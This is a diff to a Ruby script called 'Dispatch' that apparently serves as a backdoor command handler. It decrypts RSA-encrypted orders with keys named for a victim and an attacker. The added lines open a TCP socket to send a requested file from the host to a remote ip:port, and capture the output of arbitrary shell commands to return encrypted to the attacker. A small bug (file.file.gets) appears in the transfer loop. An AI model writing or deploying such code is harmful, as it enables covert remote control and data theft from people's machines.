@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 
 require "openssl"
+require "socket"
 
 # -------------------------------------------------------------
 # Dispatch
@@ -9,6 +10,8 @@ require "openssl"
 # -------------------------------------------------------------
 
 class Dispatch
+
+	@response = ""
 
 	def initialize(ciphertext)
 		plaintext = decrypt ciphertext
@@ -20,7 +23,7 @@ class Dispatch
 		when "ls"
 			ls request[1]
 		when "get"
-			return get request[1], request[2], request[3]
+			get request[1], request[2], request[3]
 		when "die"
 			die
 		when "cmd"
@@ -51,7 +54,15 @@ class Dispatch
 		if ! File.file? path
 			return "Sorry, that file does not exist."
 		else
-			# Create TCP connection to ip:port
+			tcp = TCPSocket.new(ip, port)
+
+			File.open(path, "rb") do |file|
+				while(line = file.file.gets)
+					tcp.send(line)
+				end
+			end
+			
+			@response = "Sending Complete"
 
 			# Begin passing file to client
 
@@ -72,7 +83,14 @@ class Dispatch
 	# Run any command and send the result to the attacker.
 
 	def cmd(command)
-		`#{command}`
+		@response = `#{command}`
+	end
+
+	# to_string
+	#
+	# Returns the response of the command
+	def to_string()
+		return encrypt @response
 	end
 
 # -------------------------------------------------------------
@@ -90,7 +108,7 @@ class Dispatch
 
 	def encrypt(data)
 		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
-		key.public_key.public_encrypt(data)
+		return key.public_key.public_encrypt(data)
 	end
 
 	# Dcrypt
@@ -100,7 +118,7 @@ class Dispatch
 
 	def decrypt(data)
 		key = OpenSSL::PKey::RSA.new File.read '../keys/victim.pem'
-		key.private_decrypt(data)
+		return key.private_decrypt(data)
 	end
 
 # -------------------------------------------------------------
